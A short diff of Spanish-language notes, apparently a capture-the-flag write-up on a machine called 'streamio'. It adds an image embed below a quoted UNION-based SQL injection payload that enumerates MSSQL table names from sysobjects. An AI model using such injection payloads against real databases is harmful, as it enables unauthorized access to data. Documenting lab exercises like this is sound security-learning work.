@@ -197,3 +197,5 @@ de esta manera usando la query hemos logrado enumerar el nombre de las tablas en
 ```python
 10' union select 1,name,id,4,5,6 FROM streamio..sysobjects WHERE xtype = 'U';-- -
 ```
+![[Pasted image 20240519140505.png]]
+
